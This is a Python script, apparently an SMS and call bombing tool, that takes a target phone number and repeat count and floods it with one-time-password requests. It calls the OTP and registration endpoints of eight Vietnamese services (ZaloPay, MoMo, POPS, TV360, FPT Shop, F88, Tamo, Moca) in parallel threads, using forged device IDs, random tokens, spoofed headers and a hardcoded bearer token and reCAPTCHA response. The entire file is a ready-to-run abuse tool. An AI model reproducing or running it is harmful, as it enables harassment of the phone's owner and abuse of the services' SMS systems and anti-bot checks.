import json
import uuid
import requests
import threading
from concurrent.futures import ThreadPoolExecutor
import hashlib, random ,time
from datetime import datetime
import requests
import os, sys, requests, random, json
import time
from random import choice, randint, shuffle
phone = sys.argv[1]
amount = int(sys.argv[2])
threading = ThreadPoolExecutor(max_workers=int(100000))
imei = uuid.uuid4()
ua = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36',}
jsdt = {'phone_number': phone}
json_data = {
'feature': 'register',
'phone': '+84'+phone[1:11]}
headers = {
                'Host': 'api.zalopay.vn',
                'x-user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 ZaloPayClient/7.13.1 OS/14.6 Platform/ios Secured/false  ZaloPayWebClient/7.13.1',
                'x-device-model': 'iPhone8,2',
                'x-density': 'iphone3x',
                'authorization': 'Bearer ',
                'x-device-os': 'IOS',
                'x-drsite': 'off',
                'accept': '*/*',
                'x-app-version': '7.13.1',
                'accept-language': 'vi-VN;q=1.0, en-VN;q=0.9',
                'user-agent': 'ZaloPay/7.13.1 (vn.com.vng.zalopay; build:503903; iOS 14.6.0) Alamofire/5.2.2',
                'x-platform': 'NATIVE',
                'x-os-version': '14.6',
            }
params = {'phone_number': "0"+phone[1:11]}
headerss = {
'Host': 'moca.vn',
'Accept': '*/*',
'Device-Token': str(imei),
'X-Requested-With': 'XMLHttpRequest',
'Accept-Language': 'vi',
'X-Moca-Api-Version': '2',
'platform': 'P_IOS-2.10.42',
'User-Agent': 'Pass/2.10.42 (iPhone; iOS 13.3; Scale/2.00)'}
paramss = {'phoneNumber': phone}

def random_string(length):
            number = '0123456789'
            alpha = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNPQRSTUVWXYZ'
            id = ''
            for i in range(0,length,2):
                id += random.choice(number)
                id += random.choice(alpha)
            return id
def zlpay(phone):
	token = requests.get('https://api.zalopay.vn/v2/account/phone/status', params=params, headers=headers).json()['data']['send_otp_token']
	json_data = {'phone_number': "0"+phone[1:11],'send_otp_token': token}
	response = requests.post('https://api.zalopay.vn/v2/account/otp', headers=headers, json=json_data).text
###
def momo(phone):
    microtime = int(round(time.time() * 1000))
    imei = getimei()
    secureid = get_SECUREID()
    token= get_TOKEN()
    rkey = generateRandomString(22, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')
    aaid = getimei()
    data = {
        "user":"0"+phone[1:11],
        "msgType": "SEND_OTP_MSG",
        "cmdId": f"{microtime}000000",
        "lang": "vi",
        "time": microtime,
        "channel": "APP",
        "appVer": 31062,
        "appCode": "3.1.6",
        "deviceOS": "ANDROID",
        "buildNumber": 0,
        "appId": "vn.momo.platform",
        "result": True,
        "errorCode": 0,
        "errorDesc": "",
        "momoMsg": {
            "_class": "mservice.backend.entity.msg.RegDeviceMsg",
            "number": "0"+phone[1:11],
            "imei": imei,
            "cname": "Vietnam",
            "ccode": "084",
            "device": "CPH1605",
            "firmware": "23",
            "hardware": "mt6755",
            "manufacture": "OPPO",
            "csp": "",
            "icc": "",
            "mcc": "452",
            "device_os": "Android",
            "secure_id": secureid
        },
        "extra": {
            "action": "SEND",
            "rkey": rkey,
            "AAID": aaid,
            "IDFA": "",
            "TOKEN": token,
            "SIMULATOR": "",
            "SECUREID": secureid,
            "MODELID": "oppo cph1605mt6755b6z9qwrwhuy9yhrk",
            "isVoice": True,
            "REQUIRE_HASH_STRING_OTP": True,
            "checkSum": ""
        }
    }
    data1 = {
        "user":"0"+phone[1:11],
        "msgType": "CHECK_USER_BE_MSG",
        "cmdId": f"{microtime}000000",
        "lang": "vi",
        "time": microtime,
        "channel": "APP",
        "appVer": 31062,
        "appCode": "3.1.6",
        "deviceOS": "ANDROID",
        "buildNumber": 0,
        "appId": "vn.momo.platform",
        "result": True,
        "errorCode": 0,
        "errorDesc": "",
        "momoMsg": {
            "_class": "mservice.backend.entity.msg.RegDeviceMsg",
            "number": "0"+phone[1:11],
            "imei": imei,
            "cname": "Vietnam",
            "ccode": "084",
            "device": "CPH1605",
            "firmware": "23",
            "hardware": "mt6755",
            "manufacture": "OPPO",
            "csp": "",
            "icc": "",
            "mcc": "452",
            "device_os": "Android",
            "secure_id": secureid
        },
        "extra": {
            "checkSum": ""
        }
    }
    h = {
        "agent_id" : "undefined",
        "sessionkey" : "",
        "user_phone" : "undefined",
        "authorization" : "Bearer undefined",
        "msgtype" : "SEND_OTP_MSG",
        "Host" : "api.momo.vn",
        "User-Agent" : "okhttp/3.14.17",
        "app_version": "31062",
        "app_code" : "3.1.6",
        "device_os" : "ANDROID",
        "Content-Type" : "application/json"
    }
    data = json.dumps(data)
    data1 = json.dumps(data1)
    requests.post("https://api.momo.vn/backend/auth-app/public/CHECK_USER_BE_MSG",headers=h,data=data1).text
    t = requests.post("https://api.momo.vn/backend/otp-app/public/SEND_OTP_MSG",headers=h,data=data)
    try:
        t = t.json()
    except:
        t = t.text
def generateRandomString(length, minh):
    return ''.join(random.choices(minh, k=length))
def get_SECUREID():
    return ''.join(random.choices('0123456789abcdef', k=17))
def getimei():
    return generateRandomString(8, '0123456789abcdef')+'-'+generateRandomString(4, '0123456789abcdef')+'-'+generateRandomString(4, '0123456789abcdef')+'-'+generateRandomString(4, '0123456789abcdef')+'-'+generateRandomString(12, '0123456789abcdef')
def get_TOKEN():
    return generateRandomString(22, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+':'+generateRandomString(9, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(20, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(12, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(7, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(7, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(53, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(9, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'_'+generateRandomString(11, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(4, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')
###
def pop(phone):
	requests.post("https://products.popsww.com/api/v5/auths/register", headers={"Host": "products.popsww.com","content-length": "89","profileid": "62e58a27c6f857005396318f","sec-ch-ua-mobile": "?1","authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6InI1aTZqN3dUTERBS3hMV3lZcDdaM2ZnUUJKNWk3U2tmRkJHR2tNNUlCSlYycFdiRDNwbVd1MUM2eTQyVHJRaUIiLCJ1c2VySWQiOiI2MmU1OGEyN2M2Zjg1NzAwNTM5NjMxOGUiLCJyb2xlcyI6WyJHVUVTVCJdLCJwcm9maWxlcyI6W3siaWQiOiI2MmU1OGEyN2M2Zjg1NzAwNTM5NjMxOGYiLCJhZ2UiOjEzLCJtcGFhIjp7ImlkIjoiNWQyM2UxMjU5NTI1MWI5OGJkMDQzMzc2IiwiYWdlIjoxM319LHsiaWQiOiI2MmU1OGEyN2M2Zjg1NzAwNTM5NjMxOTAiLCJhZ2UiOjcsIm1wYWEiOnsiaWQiOiI1ZDIzZTFlMjk1MjUxYjk4YmQwNDM0MWQiLCJhZ2UiOjd9fV0sImlhdCI6MTY1OTIxMDI3OSwiZXhwIjoxOTc0NTcwMjc5fQ.3exZEvv0YG1Uw0UYx2Mt9Oj3NhRb8BX-l4tIAcVv9gw","x-env": "production","content-type": "application/json","lang": "vi","sub-api-version": "1.1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","api-key": "5d2300c2c69d24a09cf5b09b","platform": "wap","sec-ch-ua-platform": "\"Linux\"","accept": "*/*","origin": "https://pops.vn","sec-fetch-site": "cross-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://pops.vn/auth/signin-signup/signup?isOffSelectProfile\u003dtrue","accept-encoding": "gzip, deflate, br"}, json=({"fullName":"","account": phone,"password":"Abcxaxgh","confirmPassword":"Abcxaxgh"})).text
###
def tv360(phone):
	requests.post("http://m.tv360.vn/public/v1/auth/get-otp-login", headers={"Host": "m.tv360.vn","Connection": "keep-alive","Content-Length": "23","Accept": "application/json, text/plain, */*","User-Agent": "Mozilla/5.0 (Linux; Android 10; moto e(7i) power Build/QOJ30.500-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36","Content-Type": "application/json","Origin": "http://m.tv360.vn","Referer": "http://m.tv360.vn/login?r\u003dhttp%3A%2F%2Fm.tv360.vn%2F","Accept-Encoding": "gzip, deflate"}, json=({"msisdn":"0"+phone[1:11]})).text
###
def fpt(phone):
	requests.post("https://fptshop.com.vn/api-data/loyalty/Home/Verification", headers={"Host": "fptshop.com.vn","content-length": "16","accept": "*/*","content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8","x-requested-with": "XMLHttpRequest","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Linux\"","origin": "https://fptshop.com.vn","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://fptshop.com.vn/","accept-encoding": "gzip, deflate, br"}, data={"phone":phone}).text
#$#
def f88(phone):
	requests.post("https://apigateway.f88.vn/services/appvay/api/onlinelending/VerifyOTP/sendOTP", headers={"Host": "apigateway.f88.vn","content-length": "595","content-encoding": "gzip","traceparent": "00-c7d4ad181d561015110814044adf720e-d3fed9b4added2cf-01","sec-ch-ua-mobile": "?1","authorization": "Bearer null","content-type": "application/json","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Linux\"","accept": "*/*","origin": "https://online.f88.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://online.f88.vn/","accept-encoding": "gzip, deflate, br"}, json={"phoneNumber":"0"+phone[1:11],"recaptchaResponse":"03ANYolqvEe93MY94VJjkvDUIsq6ysACNy1tsnG1xnFq9YLY1gyez-_QvS0YEsxe9D0ddnuXKmlrbWqvT3KTQD2Bhx9yLeQ6M-nzUChGrqS08GEhHIdCpl3JLvHctZYeX18O8qZqcHY-e7qHq1WG7kkPbykyx9KwxMDnzW3j1N0KymuMti1Z0WAUgXHDh-ifJvI3n4lp5Tzsq5k1Nswugf0X3HFexHAm9GACImJIDG46QRucLBRm0df6jfazibClJyKlLXdvnqmrjCt6Wy22C_h-RY9Iilj5Lcy9rawUShIMJoCFX08UOWP_llCE4T5h5kuUk1llSgu9pdHMK2T6OuEROwXt2begTITv-9l534brGibKVlwwbxLtfHWohLRYQC-tjYWWq7avFLPOA9d53_72KLKoYAuKjvqKul683bQ7HtEzZ-eK3VCiBQj1Za1EV3R69e648tCkNkGXr9kpr1n0ccGeNbXSuB3GHQQGPnDIGuYgalvKa77_iX68OQ90PouP2GeT_RvBY3","source":"Online"}).text
###
def call2(phone):
	requests.post("https://api.tamo.vn/web/public/client/phone/sms-code-ts", headers={"Host": "api.tamo.vn","content-length": "39","accept": "application/json, text/plain, */*","content-type": "application/json;charset\u003dUTF-8","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Linux\"","origin": "https://www.tamo.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://www.tamo.vn/","accept-encoding": "gzip, deflate, br"}, json=({"mobilePhone":{"number":"0"+phone[1:11]}})).text
###
def moca(phone):
	home = requests.get('https://moca.vn/moca/v2/users/role', params=paramss, headers=headerss).json()
	token = home['data']['registrationId']
	response = requests.post(f'https://moca.vn/moca/v2/users/registrations/{token}/verification', headers=headerss).json()
def sendmm():
	while True:
		momo(phone)
		time.sleep(30)
		for b in range(amount):
			exit()
def BBot(phone, amount):
	for i in range(amount):
		threading.submit(sendmm)
		time.sleep(3)
		time.sleep(3)
		threading.submit(call2,phone)
		time.sleep(3)
		threading.submit(moca,phone)
		threading.submit(pop,phone)
		threading.submit(tv360,phone)
		threading.submit(f88,phone)
		threading.submit(fpt,phone)
		threading.submit(zlpay,phone)
	
	
	
	
	
BBot(phone, amount)
